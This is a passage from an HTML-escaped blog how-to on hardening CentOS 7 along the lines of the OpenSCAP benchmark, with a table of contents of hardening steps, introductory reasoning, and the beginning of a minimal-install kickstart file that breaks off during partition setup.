  &lt;li&gt;&lt;a href=&quot;#secure-partition-mount-options&quot; id=&quot;markdown-toc-secure-partition-mount-options&quot;&gt;Secure Partition Mount Options&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#install-ntp&quot; id=&quot;markdown-toc-install-ntp&quot;&gt;Install NTP&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configure-system-for-aide&quot; id=&quot;markdown-toc-configure-system-for-aide&quot;&gt;Configure System for AIDE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#install-aide&quot; id=&quot;markdown-toc-install-aide&quot;&gt;Install AIDE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#prevent-users-mounting-usb-storage&quot; id=&quot;markdown-toc-prevent-users-mounting-usb-storage&quot;&gt;Prevent Users Mounting USB Storage&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enable-secure-high-quality-password-policy&quot; id=&quot;markdown-toc-enable-secure-high-quality-password-policy&quot;&gt;Enable Secure (high quality) Password Policy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#secure-etclogindefs-pasword-policy&quot; id=&quot;markdown-toc-secure-etclogindefs-pasword-policy&quot;&gt;Secure /etc/login.defs Pasword Policy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#set-last-logonaccess-notification&quot; id=&quot;markdown-toc-set-last-logonaccess-notification&quot;&gt;Set Last Logon/Access Notification&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#max-password-login-attempts-per-session&quot; id=&quot;markdown-toc-max-password-login-attempts-per-session&quot;&gt;Max Password Login Attempts per Session&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#set-deny-for-failed-password-attempts&quot; id=&quot;markdown-toc-set-deny-for-failed-password-attempts&quot;&gt;Set Deny For Failed Password Attempts&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#limit-password-reuse&quot; id=&quot;markdown-toc-limit-password-reuse&quot;&gt;Limit Password Reuse&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#verify-bootgrub2grubcfg-permissions&quot; id=&quot;markdown-toc-verify-bootgrub2grubcfg-permissions&quot;&gt;Verify /boot/grub2/grub.cfg Permissions&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#set-boot-loader-password&quot; id=&quot;markdown-toc-set-boot-loader-password&quot;&gt;Set Boot Loader Password&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#require-authentication-for-single-user-mode&quot; id=&quot;markdown-toc-require-authentication-for-single-user-mode&quot;&gt;Require Authentication for Single User Mode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-ctrl-alt-del-reboot-activation&quot; id=&quot;markdown-toc-disable-ctrl-alt-del-reboot-activation&quot;&gt;Disable Ctrl-Alt-Del Reboot Activation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enable-console-screen-locking&quot; id=&quot;markdown-toc-enable-console-screen-locking&quot;&gt;Enable Console Screen Locking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-zeroconf-networking&quot; id=&quot;markdown-toc-disable-zeroconf-networking&quot;&gt;Disable Zeroconf Networking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-ipv6-support-automatically-loading&quot; id=&quot;markdown-toc-disable-ipv6-support-automatically-loading&quot;&gt;Disable IPv6 Support Automatically Loading&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-interface-usage-of-ipv6&quot; id=&quot;markdown-toc-disable-interface-usage-of-ipv6&quot;&gt;Disable Interface Usage of IPv6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-support-for-rpc-ipv6&quot; id=&quot;markdown-toc-disable-support-for-rpc-ipv6&quot;&gt;Disable Support for RPC IPv6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#securing-root-logins&quot; id=&quot;markdown-toc-securing-root-logins&quot;&gt;Securing root Logins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enable-umask-077&quot; id=&quot;markdown-toc-enable-umask-077&quot;&gt;Enable UMASK 077&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#prune-idle-users&quot; id=&quot;markdown-toc-prune-idle-users&quot;&gt;Prune Idle Users&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#securing-cron&quot; id=&quot;markdown-toc-securing-cron&quot;&gt;Securing Cron&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sysctl-security&quot; id=&quot;markdown-toc-sysctl-security&quot;&gt;Sysctl Security&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#deny-all-tcp-wrappers&quot; id=&quot;markdown-toc-deny-all-tcp-wrappers&quot;&gt;Deny All TCP Wrappers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#basic-iptables-firewall-rules&quot; id=&quot;markdown-toc-basic-iptables-firewall-rules&quot;&gt;Basic iptables Firewall Rules&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#verify-iptables-enabled&quot; id=&quot;markdown-toc-verify-iptables-enabled&quot;&gt;Verify iptables Enabled&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-uncommon-protocols&quot; id=&quot;markdown-toc-disable-uncommon-protocols&quot;&gt;Disable Uncommon Protocols&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ensure-rsyslog-is-installed&quot; id=&quot;markdown-toc-ensure-rsyslog-is-installed&quot;&gt;Ensure Rsyslog is installed&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enable-rsyslog&quot; id=&quot;markdown-toc-enable-rsyslog&quot;&gt;Enable Rsyslog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#auditd---audit-daemon&quot; id=&quot;markdown-toc-auditd---audit-daemon&quot;&gt;Auditd - Audit Daemon&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-auditd-service&quot; id=&quot;markdown-toc-enable-auditd-service&quot;&gt;Enable auditd Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#audit-processes-which-start-prior-to-auditd&quot; id=&quot;markdown-toc-audit-processes-which-start-prior-to-auditd&quot;&gt;Audit Processes Which Start Prior to auditd&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-number-of-logs-retained&quot; id=&quot;markdown-toc-auditd-number-of-logs-retained&quot;&gt;Auditd Number of Logs Retained&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-max-log-file-size&quot; id=&quot;markdown-toc-auditd-max-log-file-size&quot;&gt;Auditd Max Log File Size&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-max_log_file_action&quot; id=&quot;markdown-toc-auditd-max_log_file_action&quot;&gt;Auditd max_log_file_action&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-space_left&quot; id=&quot;markdown-toc-auditd-space_left&quot;&gt;Auditd space_left&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-admin_space_left&quot; id=&quot;markdown-toc-auditd-admin_space_left&quot;&gt;Auditd admin_space_left&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-mail_acct&quot; id=&quot;markdown-toc-auditd-mail_acct&quot;&gt;Auditd mail_acct&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#configure-auditd-to-use-audispd-plugin&quot; id=&quot;markdown-toc-configure-auditd-to-use-audispd-plugin&quot;&gt;Configure auditd to use audispd plugin&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auditd-rules-etcauditauditrules&quot; id=&quot;markdown-toc-auditd-rules-etcauditauditrules&quot;&gt;Auditd Rules: /etc/audit/audit.rules&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bulk-remove-of-services&quot; id=&quot;markdown-toc-bulk-remove-of-services&quot;&gt;Bulk Remove of Services&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bulk-enable--disable-services&quot; id=&quot;markdown-toc-bulk-enable--disable-services&quot;&gt;Bulk Enable / Disable Services&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-secure-rpc-client-service&quot; id=&quot;markdown-toc-disable-secure-rpc-client-service&quot;&gt;Disable Secure RPC Client Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-secure-rpc-server-service&quot; id=&quot;markdown-toc-disable-secure-rpc-server-service&quot;&gt;Disable Secure RPC Server Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-rpc-id-mapping-service&quot; id=&quot;markdown-toc-disable-rpc-id-mapping-service&quot;&gt;Disable RPC ID Mapping Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-network-file-systems-netfs&quot; id=&quot;markdown-toc-disable-network-file-systems-netfs&quot;&gt;Disable Network File Systems (netfs)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-network-file-system-nfs&quot; id=&quot;markdown-toc-disable-network-file-system-nfs&quot;&gt;Disable Network File System (nfs)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#if-you-dont-need-ssh-disable-it&quot; id=&quot;markdown-toc-if-you-dont-need-ssh-disable-it&quot;&gt;If you don’t need SSH disable it&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-ssh-iptables-firewall-rule&quot; id=&quot;markdown-toc-disable-ssh-iptables-firewall-rule&quot;&gt;Disable SSH iptables Firewall rule&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-avahi-server-software&quot; id=&quot;markdown-toc-disable-avahi-server-software&quot;&gt;Disable Avahi Server Software&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-the-cups-service&quot; id=&quot;markdown-toc-disable-the-cups-service&quot;&gt;Disable the CUPS Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-dhcp-service&quot; id=&quot;markdown-toc-disable-dhcp-service&quot;&gt;Disable DHCP Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#uninstall-dhcp-server-package&quot; id=&quot;markdown-toc-uninstall-dhcp-server-package&quot;&gt;Uninstall DHCP Server Package&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-dhcp-client&quot; id=&quot;markdown-toc-disable-dhcp-client&quot;&gt;Disable DHCP Client&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#specify-additional-remote-ntp-servers&quot; id=&quot;markdown-toc-specify-additional-remote-ntp-servers&quot;&gt;Specify Additional Remote NTP Servers&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-postfix&quot; id=&quot;markdown-toc-enable-postfix&quot;&gt;Enable Postfix&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#remove-sendmail&quot; id=&quot;markdown-toc-remove-sendmail&quot;&gt;Remove Sendmail&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#postfix-disable-network-listening&quot; id=&quot;markdown-toc-postfix-disable-network-listening&quot;&gt;Postfix Disable Network Listening&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#configure-smtp-greeting-banner&quot; id=&quot;markdown-toc-configure-smtp-greeting-banner&quot;&gt;Configure SMTP Greeting Banner&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-xinetd-service&quot; id=&quot;markdown-toc-disable-xinetd-service&quot;&gt;Disable xinetd Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#system-audit-logs-permissions&quot; id=&quot;markdown-toc-system-audit-logs-permissions&quot;&gt;System Audit Logs Permissions&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#system-audit-logs-must-be-owned-by-root&quot; id=&quot;markdown-toc-system-audit-logs-must-be-owned-by-root&quot;&gt;System Audit Logs Must Be Owned By Root&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-autofs&quot; id=&quot;markdown-toc-disable-autofs&quot;&gt;Disable autofs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-uncommon-filesystems&quot; id=&quot;markdown-toc-disable-uncommon-filesystems&quot;&gt;Disable uncommon filesystems&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-core-dumps-for-all-users&quot; id=&quot;markdown-toc-disable-core-dumps-for-all-users&quot;&gt;Disable core dumps for all users&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disable-core-dumps-for-suid-programs&quot; id=&quot;markdown-toc-disable-core-dumps-for-suid-programs&quot;&gt;Disable core dumps for SUID programs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#buffer-overflow-protection&quot; id=&quot;markdown-toc-buffer-overflow-protection&quot;&gt;Buffer Overflow Protection&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-execshield&quot; id=&quot;markdown-toc-enable-execshield&quot;&gt;Enable ExecShield&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#check--enable-aslr&quot; id=&quot;markdown-toc-check--enable-aslr&quot;&gt;Check / Enable ASLR&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-xd-or-nx-support-on-x86-systems&quot; id=&quot;markdown-toc-enable-xd-or-nx-support-on-x86-systems&quot;&gt;Enable XD or NX Support on x86 Systems&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#selinux&quot; id=&quot;markdown-toc-selinux&quot;&gt;SELinux&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#confirm-selinux-is-not-disabled&quot; id=&quot;markdown-toc-confirm-selinux-is-not-disabled&quot;&gt;Confirm SELinux is not disabled&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#selinux-targeted--enforcing&quot; id=&quot;markdown-toc-selinux-targeted--enforcing&quot;&gt;SELinux Targeted / Enforcing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-the-selinux-restorecond-service&quot; id=&quot;markdown-toc-enable-the-selinux-restorecond-service&quot;&gt;Enable the SELinux restorecond Service&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#check-no-daemons-are-unconfined-by-selinux&quot; id=&quot;markdown-toc-check-no-daemons-are-unconfined-by-selinux&quot;&gt;Check no daemons are unconfined by SELinux&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#prevent-log-in-to-accounts-with-empty-password&quot; id=&quot;markdown-toc-prevent-log-in-to-accounts-with-empty-password&quot;&gt;Prevent Log In to Accounts With Empty Password&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#secure-ssh&quot; id=&quot;markdown-toc-secure-ssh&quot;&gt;Secure SSH&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#allow-only-ssh-protocol-2&quot; id=&quot;markdown-toc-allow-only-ssh-protocol-2&quot;&gt;Allow Only SSH Protocol 2&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#limit-users-ssh-access&quot; id=&quot;markdown-toc-limit-users-ssh-access&quot;&gt;Limit Users’ SSH Access&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#set-ssh-idle-timeout-interval&quot; id=&quot;markdown-toc-set-ssh-idle-timeout-interval&quot;&gt;Set SSH Idle Timeout Interval&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#set-ssh-client-alive-count&quot; id=&quot;markdown-toc-set-ssh-client-alive-count&quot;&gt;Set SSH Client Alive Count&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-ssh-support-for-rhosts-files&quot; id=&quot;markdown-toc-disable-ssh-support-for-rhosts-files&quot;&gt;Disable SSH Support for .rhosts Files&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-host-based-authentication&quot; id=&quot;markdown-toc-disable-host-based-authentication&quot;&gt;Disable Host-Based Authentication&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-ssh-root-login&quot; id=&quot;markdown-toc-disable-ssh-root-login&quot;&gt;Disable SSH Root Login&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-ssh-access-via-empty-passwords&quot; id=&quot;markdown-toc-disable-ssh-access-via-empty-passwords&quot;&gt;Disable SSH Access via Empty Passwords&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enable-ssh-warning-banner&quot; id=&quot;markdown-toc-enable-ssh-warning-banner&quot;&gt;Enable SSH Warning Banner&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#do-not-allow-ssh-environment-options&quot; id=&quot;markdown-toc-do-not-allow-ssh-environment-options&quot;&gt;Do Not Allow SSH Environment Options&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#use-only-approved-ciphers&quot; id=&quot;markdown-toc-use-only-approved-ciphers&quot;&gt;Use Only Approved Ciphers&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#secure-x-windows&quot; id=&quot;markdown-toc-secure-x-windows&quot;&gt;Secure X Windows&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-x-windows-startup-by-setting-runlevel&quot; id=&quot;markdown-toc-disable-x-windows-startup-by-setting-runlevel&quot;&gt;Disable X Windows Startup By Setting Runlevel&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#remove-the-x-windows-package-group&quot; id=&quot;markdown-toc-remove-the-x-windows-package-group&quot;&gt;Remove the X Windows Package Group&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#prompt-os-update-installation&quot; id=&quot;markdown-toc-prompt-os-update-installation&quot;&gt;Prompt OS update installation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;security-harden-centos-7&quot;&gt;Security Harden CentOS 7&lt;/h2&gt;

&lt;p&gt;This HowTo walks you through the steps required to &lt;strong&gt;security harden CentOS 7&lt;/strong&gt;, it’s based on the &lt;a href=&quot;http://www.open-scap.org/page/Main_Page&quot;&gt;OpenSCAP&lt;/a&gt; benchmark, unfortunately the current version of OpenSCAP that ships with CentOS does not offically support CentOS CPE’s. But there is a “workaround” that will allow OpenSCAP + OpenSCAP workbench to run on CentOS, I’ll document this in a separate post.&lt;/p&gt;

&lt;h2 id=&quot;based-on-a-minimal-install&quot;&gt;Based on a Minimal Install&lt;/h2&gt;

&lt;p&gt;To follow this guide you will need a minimal CentOS 7 install, ideally using the Kickstart file below or copying it’s partition layout. Installing CentOS 7 using a minimal installation reduces the attack surface and ensures you &lt;em&gt;only install software that you require&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This guide only covers the base system + SSH hardening, I will document specific service hardening separately such as HTTPD, SFTP, LDAP, BIND etc…&lt;/p&gt;

&lt;p&gt;In the section related to removing unrequired services, if you installed a minimal centos 7 install, you’ll likely have nothing to remove or disable - I’ve included this section for completeness.&lt;/p&gt;

&lt;h2 id=&quot;issues-with-security-hardening&quot;&gt;Issues with Security Hardening&lt;/h2&gt;

&lt;p&gt;After hardening a system you may run into issues, hardening a system will make it more restrictive, especially SELinux or filesystem related permission hardening. When hardening a system for a specific task I recommend creating a duplicate virtual machine you can use for troubleshooting should you run into a issue that you &lt;em&gt;think&lt;/em&gt; is related to security hardening, you’ll be able to confirm by running it on the Vanilla system.&lt;/p&gt;

&lt;p&gt;Obviously &lt;strong&gt;don’t expose the Vanilla (un-hardened) system to the network!&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-use-openscap-&quot;&gt;Why use OpenSCAP ?&lt;/h2&gt;

&lt;p&gt;After a lot of research I decided to use OpenSCAP over other security hardening benchmarks / guides, here is my reasoning for doing so:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It’s open, free and actively worked on&lt;/li&gt;
  &lt;li&gt;It has an audit tool, essential to verify each system&lt;/li&gt;
  &lt;li&gt;OpenSCAP has a GUI called, workbench&lt;/li&gt;
  &lt;li&gt;OpenSCAP Workbench supports remote audits via SSH&lt;/li&gt;
  &lt;li&gt;OpenSCAP Workbench allows you to customize your scan, should you not agree with all hardening checks&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you don’t get on with workbench or auditing from the command line, Nessus has functionality for authenticated SCAP scans.&lt;/p&gt;

&lt;h2 id=&quot;kickstart&quot;&gt;Kickstart&lt;/h2&gt;

&lt;p&gt;I’ve provided the following RHEL kickstart file below, it’s a minimal install with a heavy partition scheme, allowing for stricter mount options.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#version=RHEL7&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# System authorization information&lt;/span&gt;
auth &lt;span class=&quot;nt&quot;&gt;--enableshadow&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--passalgo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sha512

&lt;span class=&quot;c&quot;&gt;# Use CDROM installation media&lt;/span&gt;
cdrom
&lt;span class=&quot;c&quot;&gt;# Accept EULA&lt;/span&gt;
eula &lt;span class=&quot;nt&quot;&gt;--agreed&lt;/span&gt;

services &lt;span class=&quot;nt&quot;&gt;--enabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NetworkManager,sshd
reboot

&lt;span class=&quot;c&quot;&gt;# Run the Setup Agent on first boot&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#firstboot --enable&lt;/span&gt;
ignoredisk &lt;span class=&quot;nt&quot;&gt;--only-use&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda
&lt;span class=&quot;c&quot;&gt;# Keyboard layouts&lt;/span&gt;
keyboard &lt;span class=&quot;nt&quot;&gt;--vckeymap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us &lt;span class=&quot;nt&quot;&gt;--xlayouts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'us'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# System language&lt;/span&gt;
lang en_US.UTF-8
&lt;span class=&quot;c&quot;&gt;# SELinux&lt;/span&gt;
selinux &lt;span class=&quot;nt&quot;&gt;--enforcing&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Network information&lt;/span&gt;
network  &lt;span class=&quot;nt&quot;&gt;--bootproto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dhcp &lt;span class=&quot;nt&quot;&gt;--device&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;eno16777736 &lt;span class=&quot;nt&quot;&gt;--onboot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on &lt;span class=&quot;nt&quot;&gt;--ipv6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;off
network  &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;default-vm
&lt;span class=&quot;c&quot;&gt;# Root password&lt;/span&gt;
rootpw &lt;span class=&quot;nt&quot;&gt;--iscrypted&lt;/span&gt; HASHGOESHERE
&lt;span class=&quot;c&quot;&gt;# System timezone&lt;/span&gt;
timezone Europe/London &lt;span class=&quot;nt&quot;&gt;--isUtc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--ntpservers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;prime.transformers
&lt;span class=&quot;c&quot;&gt;# System bootloader configuration&lt;/span&gt;
bootloader &lt;span class=&quot;nt&quot;&gt;--location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mbr &lt;span class=&quot;nt&quot;&gt;--boot-drive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda
&lt;span class=&quot;c&quot;&gt;# Partition clearing information&lt;/span&gt;
clearpart &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--drives&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda
ignoredisk &lt;span class=&quot;nt&quot;&gt;--only-use&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda
&lt;span class=&quot;c&quot;&gt;# LVM&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Disk partitioning information&lt;/span&gt;
part pv.18 &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lvmpv&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--ondisk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8004
part pv.11 &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lvmpv&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--ondisk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8004
part /boot &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ext4&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--ondisk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sda &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000
volgroup lg_data &lt;span class=&quot;nt&quot;&gt;--pesize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4096 pv.18
volgroup lg_os &lt;span class=&quot;nt&quot;&gt;--pesize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4096 pv.11
logvol /  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_root &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol /home  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_home &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_data
